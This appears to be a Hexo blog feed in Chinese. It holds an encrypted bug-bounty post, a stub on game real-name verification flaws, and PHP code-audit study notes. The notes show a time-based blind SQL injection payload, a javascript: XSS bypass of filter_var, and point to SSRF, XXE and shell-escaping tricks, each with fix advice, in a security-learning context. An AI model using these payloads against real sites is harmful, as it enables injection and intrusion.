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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游戏漏洞挖掘——待补充</title>
      <link href="/2022/04/23/%E6%B8%B8%E6%88%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E5%BE%85%E8%A1%A5%E5%85%85/"/>
      <url>/2022/04/23/%E6%B8%B8%E6%88%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E5%BE%85%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏漏洞挖掘"><a href="#游戏漏洞挖掘" class="headerlink" title="游戏漏洞挖掘"></a>游戏漏洞挖掘</h1><h2 id="1、游戏实名认证"><a href="#1、游戏实名认证" class="headerlink" title="1、游戏实名认证"></a>1、游戏实名认证</h2><p>输入假的sfz号码 能过认证成功 &#x3D;&#x3D;漏洞</p><p>tx低危 sn高危</p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日安全代码审计学习(一)</title>
      <link href="/2022/04/20/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
      <url>/2022/04/20/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="红日安全代码审计学习"><a href="#红日安全代码审计学习" class="headerlink" title="红日安全代码审计学习"></a>红日安全代码审计学习</h1><p>项目地址：</p><p><a href="https://github.com/hongriSec/PHP-Audit-Labs#">https://github.com/hongriSec/PHP-Audit-Labs#</a></p><p>记录一下自己的学习过程</p><p>顺便加上一些自己的理解</p><span id="more"></span><h2 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h2><h3 id="in-array函数缺陷"><a href="#in-array函数缺陷" class="headerlink" title="in_array函数缺陷"></a><strong>in_array函数缺陷</strong></h3><p>github地址：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md">in_array函数缺陷</a></p><blockquote><p><a href="http://php.net/manual/zh/function.in-array.php"> <strong>in_array</strong> </a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：检查数组中是否存在某个值</p><p><strong>定义</strong> ： <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p><p>在 <strong>$haystack</strong> 中搜索 <strong>$needle</strong> ，如果第三个参数 <strong>$strict</strong> 的值为 <strong>TRUE</strong> ，则 <strong>in_array()</strong> 函数会进行强检查，检查 <strong>$needle</strong> 的类型是否和 <strong>$haystack</strong> 中的相同。如果找到 <strong>$haystack</strong> ，则返回 <strong>TRUE</strong>，否则返回 <strong>FALSE</strong>。</p></blockquote><p>in_array()第三个参数未设置为true时，是弱匹配。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span><span class="keyword">shell</span>.php </span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D; </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">7 </span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>,<span class="number">1</span> and if(ascii(substr((select database()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">112</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)));#</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D; </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span> </span><br></pre></td></tr></table></figure><h4 id="利用场景："><a href="#利用场景：" class="headerlink" title="利用场景："></a>利用场景：</h4><p>文件上传、SQL注入白名单绕过</p><h4 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h4><p>1、第三个参数设置为 <strong>true</strong></p><p>2、使用正则匹配来处理变量</p><h3 id="filter-var函数缺陷"><a href="#filter-var函数缺陷" class="headerlink" title="filter_var函数缺陷"></a><strong>filter_var函数缺陷</strong></h3><p>github地址：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day2/files/README.md">filter_var函数缺陷</a></p><blockquote><p><a href="http://php.net/manual/zh/function.filter-var.php"> <strong>filter_var</strong> </a>： (PHP 5 &gt;&#x3D; 5.2.0, PHP 7)</p><p><strong>功能</strong> ：使用特定的过滤器过滤一个变量</p><p><strong>定义</strong> ：<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$variable</code> [, int <code>$filter</code> &#x3D; FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$options</code> ]] )</p></blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = filter<span class="constructor">_var($<span class="params">_GET</span>[&#x27;<span class="params">url</span>&#x27;],FILTER_VALIDATE_URL)</span>;</span><br><span class="line">var<span class="constructor">_dump($<span class="params">url</span>)</span>;</span><br></pre></td></tr></table></figure><p>我们用<strong>FILTER_VALIDATE_URL</strong>过滤器做测试。</p><p>可以使用 <strong>:&#x2F;&#x2F;</strong> 来绕过。</p><p>由于原文没有讲清楚为什么可以绕过，本人测试了一下应该是因为filter_var函数在使用<strong>FILTER_VALIDATE_URL</strong>过滤器时，只要参数中含有 <strong>:&#x2F;&#x2F;</strong> 就视作为有效的URL。</p><p><strong><a href="http://www.baidu.com/">http://www.baidu.com</a> 是有效的URL</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202347838.png"></p><p><strong><a href="ftp://www.baidu.com是有效url/">ftp://www.baidu.com是有效URL</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202354607.png"></p><p><strong>0:&#x2F;&#x2F;<a href="http://www.baidu.com也是有效url,注意这个,这里可以作为一个ssrf的小trick/">www.baidu.com也是有效URL，注意这个，这里可以作为一个SSRF的小trick</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202355795.png"></p><p><strong>而<a href="http://www.baidu.com是无效的url/">www.baidu.com是无效的URL</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202356483.png"></p><h4 id="利用场景：-1"><a href="#利用场景：-1" class="headerlink" title="利用场景："></a>利用场景：</h4><p>XSS绕过</p><p>XSS场景可以使用Javascript伪协议进行绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>://comment％<span class="number">250</span>aalert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> <strong>&#x2F;&#x2F;</strong> 在JavaScript中表示单行注释， 对**%** 百分号编码成 <strong>%25</strong>，我们这里用了字符 <strong>%0a</strong> ，该字符为换行符，所以 <strong>alert</strong> 语句与注释符 <strong>&#x2F;&#x2F;</strong> 就不在同一行</p><p>程序将浏览器发来的payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>://comment％<span class="number">250</span>aalert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> 先解码成： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>://comment%<span class="number">0</span>aalert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> 存储在可回显在页面上变量中，然后用户点击就会触发<strong>alert</strong>函数，弹窗。</p><p><strong>SSRF trick</strong></p><p><strong>看这篇文章</strong></p><p><a href="https://www.anquanke.com/post/id/101058">https://www.anquanke.com/post/id/101058</a></p><h4 id="修复建议：-1"><a href="#修复建议：-1" class="headerlink" title="修复建议："></a>修复建议：</h4><p>对于XSS的话，最好是过滤关键词+实体化编码。</p><p>对于ssrf的话，建议正则匹配吧。</p><h3 id="实例化任意对象漏洞"><a href="#实例化任意对象漏洞" class="headerlink" title="实例化任意对象漏洞"></a>实例化任意对象漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day3/files/README.md">红日安全]代码审计Day3 - 实例化任意对象漏洞</a></p><p>这个漏洞类似于php任意代码执行了</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204210028203.png"></p><p>实例化类的类名和传入类的参数均在用户的控制之下，攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 <strong>SimpleXMLElement</strong> 来进行 <strong>XXE</strong> 攻击，进而读取目标文件的内容，甚至命令执行。</p><p>先看看 <strong>SimpleXMLElement</strong> 类的定义：</p><blockquote><p><a href="http://php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> ：(PHP 5, PHP 7)</p><p><strong>功能</strong> ：用来表示XML文档中的元素，为PHP的内置类。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204210103549.png"></p><p>data：格式正确的XML字符串，当参数<code>data_is_url</code>是<code>True</code>时，传入一个URL字符串</p><p>options：（可选）用于指定其他Libxml参数。</p><p><strong>SimpleXMLElement</strong> 导致的XXE攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204210034481.png"></p><h4 id="利用场景：-2"><a href="#利用场景：-2" class="headerlink" title="利用场景："></a>利用场景：</h4><p>XXE</p><h4 id="修复建议：-2"><a href="#修复建议：-2" class="headerlink" title="修复建议："></a>修复建议：</h4><p>可以修改代码，不要用这种可控的参数形式。</p><p>然后提一下对XXE漏洞进行修复，可以禁止加载XML实体对象。</p><h3 id="strpos使用不当引发漏洞"><a href="#strpos使用不当引发漏洞" class="headerlink" title="strpos使用不当引发漏洞"></a>strpos使用不当引发漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day4/files/README.md">红日安全]代码审计Day4 - strpos使用不当引发漏洞</a>&#96;</p><p>结合具体场景代码</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204220113952.png"></p><p>代码在 <strong>第8行</strong> 和 <strong>第9行</strong> 使用 <strong>strpos</strong> 函数来防止输入的参数含有 &lt; 和 &gt; 符号，猜测开发者应该是考虑到非法字符注入问题。</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.strpos.php">strpos</a></strong> — 查找字符串首次出现的位置</p><p>作用：主要是用来查找字符在字符串中首次出现的位置。</p><p>结构：<code>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&#x27;a&#x27;</span>));   <span class="comment">#0</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&#x27;x&#x27;</span>));   <span class="comment">#false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面场景代码中核心判断代码是</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(!strpos($user,&#x27;&lt;&#x27;) || !strpos($user,&#x27;&gt;&#x27;)) &amp;&amp; (!strpos($pass,&#x27;&lt;&#x27;) || !strpos($pass,&#x27;&gt;&#x27;))</span><br></pre></td></tr></table></figure><p>作者考虑到可能有黑客会在登陆点进行SQL注入测试，所以判断了一下是否出现 <strong>‘&lt;’** 或 **’&gt;’</strong> 若出现则strpos函数获得出现位置，再配合  <strong>!</strong>  取反得到false</p><p>先不说strpos函数的问题，这段代码的逻辑就有问题，如果$user只出现了&gt;或&lt;号但$pass没有出现&gt;或&lt;号，那么依然可以判定成功。</p><p>例如这样</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204220131557.png"></p><p>再说回strpos函数的绕过，因为strpos函数是取字符位置，但是如果取到了位置为<strong>0</strong>，那么通过！取反得到的就会是<strong>true</strong>了，就会导致判断成功，代码如下</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204220134822.png"></p><h4 id="利用场景：-3"><a href="#利用场景：-3" class="headerlink" title="利用场景："></a>利用场景：</h4><p>ctf印象中见过</p><h4 id="修复建议：-3"><a href="#修复建议：-3" class="headerlink" title="修复建议："></a>修复建议：</h4><p>代码逻辑优化</p><p>或者登录验证那块不要这么写了（真要防止SQL注入，这样写会不会太儿戏了。。。）</p><h3 id="escapeshellarg与escapeshellcmd使用不当"><a href="#escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="escapeshellarg与escapeshellcmd使用不当"></a>escapeshellarg与escapeshellcmd使用不当</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md">红日安全]代码审计Day5 - escapeshellarg与escapeshellcmd使用不当</a></p><p>原理：</p><p><strong>escapeshellarg()</strong> </p><p>将转码任何已经存在的单引号</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$test</span>));</span><br><span class="line"><span 